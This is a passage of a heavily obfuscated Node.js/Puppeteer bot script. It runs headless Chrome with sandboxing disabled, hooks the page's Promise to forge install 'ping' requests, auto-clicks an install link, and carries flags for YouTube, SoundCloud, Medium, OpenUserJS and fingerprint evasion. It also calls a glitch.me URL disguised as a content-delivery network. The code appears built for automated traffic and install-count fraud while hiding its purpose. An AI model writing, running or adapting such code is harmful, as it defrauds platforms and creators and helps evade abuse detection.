y[0x335 * 0x8 + -0x16da + -0x2cb & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= -0x9d1 + -0x16e9 + 0x12 * 0x1d5 ? (this['block'] = P[0x725 + -0x4 * -0x211 + -0xf59 * 0x1], this['start'] = N - (0x11c8 + -0x25c3 + 0x143b), this['hash'](), this['hashed'] = 0x20e8 + 0x1724 + -0x380b) : this['start'] = N;
                }
                return this['bytes'] > -0x14 * -0x1417a75 + -0x623bd * -0x4457 + 0xbcb1ea60 * -0x1 && (this['hBytes'] += this['bytes'] / (0x27fd5fc * -0x4d + -0x43545dc4 + 0x10 * 0x203c7ba9) << 0x1f79 + -0x1 * -0x1454 + -0x33cd, this['bytes'] = this['bytes'] % (0x76856 * -0xe3a + -0xb222b49c + 0xf2f33 * 0x2388)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = 0x1 * -0x11a9 + -0x159 * -0xa + 0x4 * 0x10c;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
                J[-0x2540 + -0x1d8e + -0x13d * -0x36] = this['block'], J[K >> 0x2557 + 0x248a * 0x1 + 0x49df * -0x1] |= x[0x3 * 0x419 + -0x5 * 0x6e7 + -0x769 * -0x3 & K], this['block'] = J[-0xc * -0x129 + 0x1b6f * -0x1 + 0xd93], K >= 0x340 * 0x1 + -0x7b6 + 0x257 * 0x2 && (this['hashed'] || this['hash'](), J[0x12a * 0x21 + -0x97 + 0x1a5 * -0x17] = this['block'], J[-0xb9 * 0x35 + 0x1a79 * 0x1 + -0xbe4 * -0x1] = J[-0x14 * -0x19f + 0x2387 + -0x43f2] = J[-0x162d + 0x2e1 * 0x8 + 0x1 * -0xd9] = J[0x26 * 0x47 + 0x197f + 0xae * -0x35] = J[-0x7 * -0x24b + -0xc7 * 0x7 + -0xa98] = J[0x1d3a + -0x264e + 0x919] = J[0x2f3 + -0xefc * -0x2 + 0x15 * -0x191] = J[0x1b87 + -0x4f5 + -0x168b * 0x1] = J[0x6 * 0x394 + 0x482 + -0x51 * 0x52] = J[0x1763 + 0x3 * -0x699 + -0x38f] = J[0x1ad3 + -0x1fdc * -0x1 + 0x1 * -0x3aa5] = J[0x17c2 + -0x2011 * -0x1 + 0x66 * -0x8c] = J[-0x20b6 + 0x22f7 * 0x1 + -0x5 * 0x71] = J[0x15f8 + -0x1 * -0x175f + 0x2aa * -0x11] = J[-0xc69 * -0x1 + -0x1088 * 0x1 + 0x42d] = J[-0x1565 * 0x1 + 0x189f + -0x32b] = 0x1 * 0x1516 + -0x11e4 + 0x1 * -0x332), J[0xd5 + 0xe9 * -0x1f + 0x1 * 0x1b70] = this['hBytes'] << -0xa * -0x21d + -0x2 * 0x5ae + -0x9c3 | this['bytes'] >>> -0x195f + 0xaff * -0x1 + 0x247b, J[0x179b + -0x3d5 + -0x13b7 * 0x1] = this['bytes'] << 0x14a4 + -0x4 * -0x92b + -0x394d, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = -0x10b1 + -0x1bb3 + -0xb1d * -0x4; J < -0xa4 * -0x14 + -0x1c27 + -0x1 * -0xfa7; ++J)
                K = Q[J - (-0x2328 + -0x1a33 * 0x1 + -0x1 * -0x3d5e)] ^ Q[J - (-0x57d + 0x2 * 0xbee + 0x3ab * -0x5)] ^ Q[J - (-0xbe9 + 0x1828 + -0xc31)] ^ Q[J - (-0x741 * -0x3 + 0x394 * 0x1 + 0x86d * -0x3)], Q[J] = K << -0xf33 + 0x15 * 0x18a + -0x111e | K >>> 0x747 + -0x6a2 + 0x86 * -0x1;
              for (J = -0x8 * -0x4ae + 0x1 * 0x38b + -0x27 * 0x10d; J < -0xfff + -0x14e7 * 0x1 + -0x1 * -0x24fa; J += 0x4 * -0x3e1 + 0x12c5 * 0x1 + -0x12 * 0x2e)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x24d9 * -0x1 + 0x1113 + 0x13cb | L >>> 0x57 * 0x2b + -0xf64 + 0xe2) + (M & N | ~M & O) + P + (-0x60dbe9cf + 0x33f91b43 + 0x87654825) + Q[J] << -0x1424 + 0x3d9 + 0x1 * 0x104b) << -0x898 + -0x2 * 0xca3 + 0x19 * 0x15b | P >>> 0x39 * -0xa9 + -0x198c + 0x3f48) + (L & (M = M << 0x33 * -0xb5 + 0x11ef * 0x2 + -0x4f * -0x1 | M >>> 0x1eb3 + 0x2537 + -0x43e8) | ~L & N) + O + (0x9360a086 + 0x6521b337 + -0xd2aa783 * 0xc) + Q[J + (0x24c3 + -0x1 * -0x385 + -0x2847)] << 0x312 * 0x2 + -0x146e + 0xe4a) << 0x20b * -0x13 + 0x1eb4 + 0x822 | O >>> -0x6d4 + -0x13d0 + 0x1abf) + (P & (L = L << 0x7 * 0x1 + -0x115 * -0xb + -0x70 * 0x1b | L >>> 0x915 + -0x2663 + 0x43 * 0x70) | ~P & M) + N + (0xd * 0xb5c1470 + -0x66840b7d + 0x2d597b66) + Q[J + (0xc73 * 0x1 + -0x1ccb + 0x105a)] << -0x2 * -0x490 + -0x28 * -0x6c + -0x10 * 0x1a0) << 0x1 * 0x1449 + -0x1fd * 0xa + -0x62 | N >>> -0x1f41 + -0x3 * 0xbaf + 0x4269) + (O & (P = P << -0x2a7 * -0xb + -0x3 * -0x1e1 + -0x22b2 | P >>> -0x7 * 0x130 + -0x2621 + 0x2e73) | ~O & L) + M + (-0x7515ed75 + 0x2332e8d8 + 0xac657e36) + Q[J + (-0x235a + -0x2e7 * 0x8 + 0x3a95)] << -0x10d6 * -0x1 + 0xc5 * -0x15 + -0xad * 0x1) << -0x1e97 + 0x1a09 + -0x1 * -0x493 | M >>> -0x2 * 0x458 + 0x2 * 0xc8e + -0x1051) + (N & (O = O << 0xf7b + -0x2176 + -0x29 * -0x71 | O >>> 0x1 * 0x1b25 + 0x28c * -0x1 + -0x1897) | ~N & P) + L + (0x6f6d4269 + -0x3a6d * 0x1bfba + 0x5143fd62) + Q[J + (-0x5af + 0x2 * 0x595 + -0x1 * 0x577)] << 0x711 + -0x5a1 * 0x3 + 0x9d2, N = N << 0x2 * 0xcaa + -0x522 + -0x1414 | N >>> 0x21e2 + 0x833 * -0x1 + -0x19ad;
              for (; J < 0x1f3b + -0x15b + -0x1db8; J += -0x7c4 + -0x1f08 + 0x20b * 0x13)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x2 * 0x54d + -0x1fb4 * -0x1 + -0x1 * 0x1515 | L >>> -0x19c2 + -0x231f + 0x3cfc) + (M ^ N ^ O) + P + (-0x5f5204a4 + -0x14a64b96 * 0x3 + -0x31a161 * -0x567) + Q[J] << -0x770 + -0x23a5 + 0x2b15) << 0x1d15 + 0x2196 + -0x3ea6 | P >>> -0x230e + -0x1a5d + 0x3d86) + (L ^ (M = M << -0x2300 + 0x23 * -0x22 + -0x13e2 * -0x2 | M >>> 0x256 * 0x9 + 0x4 * 0x1e8 + -0x34 * 0x8d) ^ N) + O + (-0xd45b1eb3 + -0x197e7 * -0x2ea7 + 0xf8df70a3) + Q[J + (-0x1fac + -0x854 + 0x2801)] << -0xdfd + 0x13d5 + -0x5d8) << 0x1b6a + 0x809 + -0x1 * 0x236e | O >>> -0x1d41 + -0x1 * 0x1173 + -0x1 * -0x2ecf) + (P ^ (L = L << -0x4e6 + -0x1f * -0xd7 + -0x1505 * 0x1 | L >>> -0x454 + 0x86 * -0x4 + 0x1 * 0x66e) ^ M) + N + (-0x90ee1ff9 + -0x2b5f35f0 + 0x148aefa * 0xe9) + Q[J + (0x1ef2 + 0x2bd + -0x21ad * 0x1)] << 0x157 * -0x14 + -0x1 * 0x200b + -0x139d * -0x3) << 0x1 * 0x1327 + 0x36d * 0x7 + -0x2b1d | N >>> 0x96f + 0x366 + -0x21f * 0x6) + (O ^ (P = P << -0x1 * 0x26ed + 0x1c1d + 0xaee | P >>> -0x2 * 0x4ab + -0x1 * -0x2225 + -0x18cd) ^ L) + M + (0x3a7c5d * 0x212 + -0xbd0a6 * -0xfaa + -0x89f1 * 0x16a75) + Q[J + (-0x175 + 0x805 * 0x2 + -0xe92)] << -0x161c + -0x23f + 0x5 * 0x4df) << 0x35a + 0x3cf + -0x724 | M >>> 0x1 * 0x5c1 + 0x955 + -0xefb) + (N ^ (O = O << -0x748 * -0x2 + 0x3 * -0x7f3 + 0x967 | O >>> 0x1 * -0x2605 + -0x3 * -0x57f + 0x158a) ^ P) + L + (-0x50087 * 0x2705 + -0x82fc48ee + 0x1b503c832) + Q[J + (0x50e * -0x6 + -0x12fb + -0x3 * -0x1071)] << 0xa8c + -0x1e2b + 0x139f * 0x1, N = N << -0xe70 + -0xf * -0x23b + -0x12e7 | N >>> -0x4d1 + -0x18f0 + -0x191 * -0x13;
              for (; J < -0xf * -0x22f + 0xe * 0xc9 + -0x2b83; J += -0x1adb * 0x1 + -0x14ea + 0x2fca)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x7f2 + -0x2244 + -0x1 * -0x1a57 | L >>> -0x1a27 + 0x577 + 0x14cb) + (M & N | M & O | N & O) + P - (-0x4c270 * -0x10d1 + -0x3f5ee4a * 0x31 + 0x7da86 * 0x1ce5) + Q[J] << 0xaa8 + -0x26af * -0x1 + 0x11 * -0x2e7) << -0x17a * 0x2 + 0x13 * -0xf1 + -0x10b * -0x14 | P >>> -0xcb + -0x5ed + 0x6d3 * 0x1) + (L & (M = M << 0x14 * 0x1ac + -0x2705 + 0x1 * 0x5b3 | M >>> -0x167 * -0x3 + 0xb3 * 0x17 + 0xa24 * -0x2) | L & N | M & N) + O - (0xc3c82782 + 0x60b34ac1 * 0x1 + 0x3 * -0x3bdd0fb5) + Q[J + (-0x2283 + 0x31 * -0x1a + 0x277e * 0x1)] << -0x1091 * 0x1 + 0x460 + 0xc31) << -0x13 * 0xfc + 0x3a * 0x97 + -0xf7d | O >>> -0x45 * 0x58 + 0x17f3 + -0x10 * 0x2) + (P & (L = L << -0x1 * 0xa7 + -0x710 + 0x7d5 | L >>> 0x1 * -0x859 + -0x14 * -0x52 + 0x1f3 * 0x1) | P & M | L & M) + N - (0xdfcbcdee + 0x1e4a6f * -0x3f0 + -0x1 * -0x85d8a46) + Q[J + (0x26 * 0x2d + -0x3a * -0x19 + -0xc56)] << -0x2a * -0x13 + 0x14b * -0x12 + 0x1428) << 0x6b * -0x1 + -0x74a * 0x4 + -0xecc * -0x2 | N >>> 0x6e1 * -0x4 + -0x1 * -0x326 + 0x1879) + (O & (P = P << 0x2 * -0x3a9 + -0x1eda + 0x264a | P >>> -0x1caa + 0x16a1 + 0x60b) | O & L | P & L) + M - (-0x67 * -0x1a39b4d + -0x5f100074 + -0x2720c79d * -0x1) + Q[J + (-0x6a0 + -0xb * -0x11 + -0x36 * -0x1c)] << -0xaf * -0x17 + 0x687 + 0x2 * -0xb20) << -0x106f * 0x1 + 0x552 + -0x591 * -0x2 | M >>> 0x1f69 + 0x25f8 + -0x4546 * 0x1) + (N & (O = O << 0x16bf + -0xcb6 + -0x1 * 0x9eb | O >>> 0x2341 + 0x94 * -0x9 + -0x1e0b * 0x1) | N & P | O & P) + L - (-0x9086dab5 + -0x4f86fd6 * -0xb + 0xcabe4fa7) + Q[J + (0x640 + -0x40c + -0x230)] << 0x519 + 0x1a * 0x110 + -0x20b9, N = N << 0x1 * 0x22e1 + -0x1 * -0x11c2 + 0xa81 * -0x5 | N >>> 0xb * 0x27 + 0x82 * -0x15 + 0x31 * 0x2f;
              for (; J < -0x257 * 0xf + 0x21d0 + 0x199; J += 0x25d7 + 0x1a19 + -0x3feb)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x95 * 0x38 + -0x1d16 + 0x1 * -0x37d | L >>> 0x6f7 * -0x1 + 0xe * -0x27d + 0x12a * 0x24) + (M ^ N ^ O) + P - (-0x19ed0183 + 0x401132e2 + 0x1e1 * 0x83c2b) + Q[J] << 0xd8 * -0xf + 0xb5d + 0x14b) << -0x7 * 0x4a7 + 0x22 * -0x51 + -0x49 * -0x98 | P >>> -0x1ea0 + -0x1 * -0x13ff + 0xabc) + (L ^ (M = M << -0x1c5 * 0xd + -0x1211 + 0x1498 * 0x2 | M >>> 0x1fcd + 0x2 * -0x779 + 0x1 * -0x10d9) ^ N) + O - (0x3c006f1f + -0x5e5254c + -0x278b3 * 0x33) + Q[J + (0x10e2 + 0x203 * 0x1 + 0x64c * -0x3)] << -0x17e3 + -0x171a + 0x20b * 0x17) << -0x56c + 0x1 * -0x13ff + -0x10 * -0x197 | O >>> 0x98b * -0x2 + 0x1f6c + 0xc3b * -0x1) + (P ^ (L = L << -0x4f * 0x4a + 0x3 * 0x11d + -0x139d * -0x1 | L >>> -0x1d24 + -0x1 * -0x545 + 0x17e1) ^ M) + N - (-0x1 * 0x5d5bfbb6 + 0x1 * -0x467e0101 + -0xf67 * -0xe1e77) + Q[J + (0x89b * -0x3 + -0x1 * -0x134 + 0x189f)] << -0x138a + -0xf79 + -0x2303 * -0x1) << 0x3 * 0x7c1 + -0x6 * -0x427 + 0x2 * -0x1814 | N >>> -0xc7 * 0x2e + 0xeef * 0x2 + -0x5 * -0x133) + (O ^ (P = P << -0x15b + 0x140b + -0x1292 | P >>> 0x218 + 0x1 * -0x2d1 + 0xbb) ^ L) + M - (-0x260 * 0x153dec + -0x354c3a0e + 0x9d5c88b8) + Q[J + (-0x1 * 0xa63 + 0x1392 + -0x92c)] << -0xc14 + 0x137f + -0x76b) << 0x10a6 + -0x6 * 0x5e3 + 0x12b1 | M >>> 0x11 * -0x10b + 0x1d28 + -0xb52) + (N ^ (O = O << 0x3 * 0x4e9 + 0x45 * 0x72 + -0x2d57 | O >>> -0x23c + 0x8 * 0x31c + -0x16a2) ^ P) + L - (0x1b984f7 * -0x31 + 0x6495afa6 + -0x258a01cb * -0x1) + Q[J + (0x2528 + 0x1 * -0x226d + -0x2b7)] << 0x1367 + 0x8 * -0x3a5 + 0x9c1, N = N << 0xd3 * 0x8 + -0x13ed + 0xd73 | N >>> -0xb70 + 0xb60 + 0x12;
              this['h0'] = this['h0'] + L << 0x1 * -0x1551 + -0x1b91 + 0x1871 * 0x2, this['h1'] = this['h1'] + M << 0x1 * 0x2bd + 0x189f + -0x1b5c, this['h2'] = this['h2'] + N << 0x4f * -0x17 + 0x7 * 0x27 + 0x4 * 0x182, this['h3'] = this['h3'] + O << 0x20e0 * -0x1 + 0x227e + -0x19e, this['h4'] = this['h4'] + P << 0x3 * -0x35f + 0x1 * -0x1799 + 0x21b6;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> 0xc68 + 0xb5f * -0x1 + -0xed & -0x3bb + -0xb5c + 0x2 * 0x793] + w[J >> -0xe20 + -0xdb4 * 0x2 + -0x6 * -0x6f0 & 0x4b3 + 0x24f5 * -0x1 + 0x2051] + w[J >> -0x1cff + 0x130b + 0xa08 & 0x18c7 + -0x2556 + 0xc9e] + w[J >> -0x22de + 0x14da + 0xe14 & 0x22 * -0x3b + 0x1 * 0x1343 + -0xc2 * 0xf] + w[J >> 0x1089 + 0xbd9 + -0x1c56 & -0x1f51 + 0x900 + 0x10 * 0x166] + w[J >> -0x2410 + 0x4d3 + 0x1f45 & -0x1 * -0x21b6 + 0x7f * -0x1c + -0x13c3 * 0x1] + w[J >> 0xbf2 + 0x2641 + -0x1 * 0x322f & 0x25 * -0x6f + -0x1f3 * -0x2 + 0xc34] + w[0x1c * -0x6e + 0x4f * -0x58 + 0x273f & J] + w[K >> -0x174f + -0x11b1 + 0x291c & -0x1afb + 0x3fb * 0x6 + -0x1 * -0x328] + w[K >> -0x675 * -0x3 + 0x5e1 + -0x1928 & 0x11fb + -0x27d * 0x4 + -0x7f8] + w[K >> -0x17 * -0x153 + -0xf68 + 0x1 * -0xef9 & 0x5a * 0x6d + 0x1 * -0x526 + -0x211d * 0x1] + w[K >> 0xe82 + 0xd * -0x97 + 0x5 * -0x15b & -0x258c + 0x4bd * -0x7 + 0x46c6] + w[K >> -0xd37 * 0x2 + 0x50e * -0x4 + -0x56 * -0x8b & -0x752 * 0x1 + 0xf31 + -0x7d0] + w[K >> 0x24e4 * -0x1 + -0x15cb + 0x1 * 0x3ab7 & -0x1 * 0xb0c + 0x3 * 0x1ed + -0x155 * -0x4] + w[K >> -0x1 * 0x1fe3 + 0x3 * -0xc73 + -0x115 * -0x40 & -0x2 * 0x6d1 + 0x5 * 0x4a5 + -0x988] + w[-0x994 + -0xcb6 + 0x3 * 0x773 & K] + w[L >> -0x124d + 0x1e87 + -0xc1e & -0x37a + 0x1 * -0x491 + 0x81a * 0x1] + w[L >> -0x2 * -0xb5d + -0xa08 * -0x1 + 0x1 * -0x20aa & 0x89e * 0x2 + -0x1513 + 0x1 * 0x3e6] + w[L >> -0x1b8b + -0x7e9 + 0x8e2 * 0x4 & 0x9 * 0x3b3 + -0x2d * 0x75 + -0x45 * 0x2f] + w[L >> 0x1f7 * 0x1 + 0x5 * 0x189 + -0x994 & 0x52 * 0x2b + -0x63 * 0x3f + 0xaa6] + w[L >> -0x1030 + -0x2 * -0x524 + -0x1 * -0x5f4 & 0x382 + -0x1bbe * -0x1 + 0x63d * -0x5] + w[L >> 0x1 * 0xd53 + 0x2 * -0x251 + -0x1 * 0x8a9 & -0xba1 + -0x1 * -0xa9a + 0x2 * 0x8b] + w[L >> -0x9c * 0x10 + -0x137 * 0x11 + -0x1 * -0x1e6b & 0x7a5 + 0x51 * 0x51 + 0x1 * -0x2137] + w[0xd * -0x27f + -0xb * -0x1eb + -0x17 * -0x7f & L] + w[M >> -0x16a3 + -0x2a8 * 0x4 + 0x215f * 0x1 & -0x2167 + -0xf88 * -0x2 + 0x266] + w[M >> 0x588 * -0x4 + -0x6 * -0x59e + -0xb7c & 0x620 + 0x1 * 0x1997 + -0xfd4 * 0x2] + w[M >> -0x4 * 0x7fd + -0x87a + 0x2882 & 0x1dd2 + -0x1c9 * -0x15 + -0x4340] + w[M >> 0xda9 * 0x1 + 0x126e + -0x2007 & -0x6e4 + 0x1197 + -0xaa4] + w[M >> -0x1 * 0x18f5 + 0x29 + 0x18d8 & 0x133 * -0x8 + 0x2e3 * -0xd + 0x2f2e] + w[M >> 0x11c7 + 0x12e + -0x12ed & -0x2180 + -0xd7b + 0x2f0a] + w[M >> 0x25af * 0x1 + 0xcb6 * 0x2 + 0x1 * -0x3f17 & -0x19bf + -0x1153 * 0x1 + 0x3d * 0xb5] + w[0x251 * -0x9 + 0xc * 0x57 + 0x10d4 & M] + w[N >> 0x5cd * 0x3 + 0x2625 + -0x6ee * 0x8 & 0x695 * -0x1 + -0x3c * -0x8e + -0x6a9 * 0x4] + w[N >> 0x29 * -0x93 + 0x40 * -0x5a + 0x7f * 0x5d & -0x1abe + 0x131e + 0x7af] + w[N >> 0x331 + 0x1 * -0x22ff + 0x1fe2 & 0x1d53 * 0x1 + -0x32e * 0x3 + -0x13ba] + w[N >> -0x171a + 0xcf6 + 0x28d * 0x4 & -0x256d + -0x1c8 + 0x59c * 0x7] + w[N >> 0x4 * -0x8ae + 0x1073 + 0x3 * 0x61b & -0x1cd * -0x2 + 0x15ac + -0x1937 * 0x1] + w[N >> -0x5 + -0x2081 + 0x208e & 0x2280 + 0x23cf + 0x119 * -0x40] + w[N >> -0x20d9 + 0x257e + -0x4a1 & -0xf2d + -0x589 + 0xd * 0x199] + w[0x1 * 0x1246 + 0x399 + 0x10 * -0x15d & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> -0x1 * 0x12b3 + -0x1b42 * 0x1 + 0x2e0d & -0x7 * 0x543 + 0xbd * 0xb + 0x5 * 0x5f1,
                J >> -0xdb1 + 0xe73 + -0xb2 & 0x1a15 + 0x251 * -0xb + 0x65,
                J >> -0x247d + -0x271 * 0x7 + 0x2f * 0x124 & 0x1 * 0x8ed + 0x26ef + -0x117 * 0x2b,
                0x253c + 0x422 * 0x7 + 0xc9 * -0x53 & J,
                K >> -0xa52 * 0x3 + -0x29 * 0x94 + -0x56 * -0xa3 & 0x883 + -0x2 * 0x2db + -0x16 * 0x15,
                K >> 0x49d + -0xcb9 * 0x1 + -0x2 * -0x416 & 0x10a6 + 0x1dda * -0x1 + 0xe33,
                K >> 0x1329 * 0x1 + 0x195 * 0x1 + -0x1 * 0x14b6 & 0x2483 * -0x1 + 0x3e * 0x12 + 0x2126,
                0x2 * 0x52f + 0x1 * -0x2389 + -0x18a * -0x11 & K,
                L >> -0x1 * 0x14e9 + -0x1 * -0x24ba + -0x1 * 0xfb9 & -0x24d + -0x6d * 0x1b + 0xecb,
                L >> 0x166f * 0x1 + -0x1b67 + 0x508 & -0x15fe + 0x5c4 + -0x1139 * -0x1,
                L >> 0x17c4 + -0x1fc * 0x13 + 0xc * 0x12a & 0x1 * -0x496 + 0x2 * 0x9a5 + -0xdb5,
                -0x844 + -0x8a * -0x2f + 0x5 * -0x337 & L,
                M >> 0x726 + 0x1c * 0x70 + -0x134e & 0x4 * -0x10d + -0x10 * -0xcb + 0x1 * -0x77d,
                M >> -0x52c * -0x4 + 0x214d + -0x35ed & 0xae5 * -0x3 + -0x13cf + 0x357d,
                M >> 0x241 * 0xd + 0xefe * 0x2 + -0x3b41 & -0x305 + -0x1 * -0x2639 + -0x2235,
                0x2135 + 0x1 * 0x1771 + 0x37a7 * -0x1 & M,
                N >> -0x127 * 0x14 + 0x3 * 0xb9d + -0x1 * 0xbb3 & 0x806 * 0x3 + 0x25 * -0x3d + 0x49 * -0x32,
                N >> -0x258 * 0xa + 0x14f0 + -0x8 * -0x52 & 0x8 * -0x116 + 0x1d81 + -0x13d2,
                N >> -0x15c5 + 0xf * -0x257 + 0x38e6 & -0x143b + -0x2408 + 0x3942,
                -0x1 * -0x2051 + -0x20a1 * 0x1 + 0x14f & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(-0x1a24 + -0xef * 0x25 + 0x3cc3), (K = new DataView(J))['setUint32'](0xc * -0x1b3 + 0x128d + 0x1d7, this['h0']), K['setUint32'](0x196f + 0x1 * -0x146f + -0x4fc, this['h1']), K['setUint32'](-0x6 * 0x65d + 0x1f7b + 0x6bb, this['h2']), K['setUint32'](0x2142 + -0x1 * -0x1822 + -0x3958, this['h3']), K['setUint32'](0x6b4 + 0x13fe + -0x1e7 * 0xe, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[0x1216 + -0x5 * 0x323 + -0x5 * 0x7b];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = 0xf43 + 0x210a + -0x304d;
            J[0x1a64 + 0xbf3 + 0x41 * -0x97]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[-0x17df * 0x1 + -0x35 * 0x41 + 0x2554] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), -0x8a4 + 0x12fd * -0x1 + 0x1ba2), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = -0x3e2 + 0xf4 + -0x2ef * -0x1;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, -0x159a + -0x3 * 0x74b + -0x11 * -0x2e7), Promise['resolve'](0x1da4 + 0xedf + -0x2c82);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = 0x242e + 0x20b0 + -0x44de; j < 0x1af * -0x4 + 0xfab * -0x1 + 0x1668; j++)
    i();
}
const NETWORK_PATIENCE = -0xa * 0x19b + 0x257d + 0x9d1 + (0x1385 * -0x2 + -0x8 + -0x21 * -0x18a) * Math['random'](),
  MM_NETWORK_PATIENCE = (-0x3a * 0x7 + -0x11cb + 0x1364) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;

function a() {
  const bk = [
    'easyfork.o',
    'C2L0zs96AgLODq',
    'WQZdVWvoFCkgWQuzxCo9',
    'mcaOv2LUzg93CW',
    'Ahr0Chm6lY9NCG',
    'vSo6EM5DW7tdVmkvySkh',
    'BZj5Dw5AuwXLEq',
    'CfHQsKfvDLnIuq',
    'web-securi',
    'https://gr',
    'WQKKWRDqW7ZcGwTlwmo0',
    'BIbHsxGeFN01DW',
    'WRZcUmo/W6TKCLq2Ba',
    'WQbvpSkGWP3dIMpcJZhdIG',
    'e\x20ytd-rich',
    'parent-hei',
    'yw1Zlgj0CYdML6xMNkW',
    'WQurW4ZdTmojAxCZdgK',
    'hmklWRD9WR54WRhdNhKv',
    '8.0.0.0\x20Sa',
    'W7ddSSksW4PXiCoKqq',
    'tips-1c4cb',
    'com/@fanta',
    'zwfZEwzVCMSUBW',
    'W511WR7cNdWocJldNxe',
    'hape\x20>\x20but',
    'W5pcU8oSW43cTCkb',
    'c0qR'
  ];
  a = function() {
    return bk;
  };
  return a();
}
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + W(0x8) + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + W(0x16) + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = -0x7 * 0x269 + 0x1e6e + -0xd8f; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];
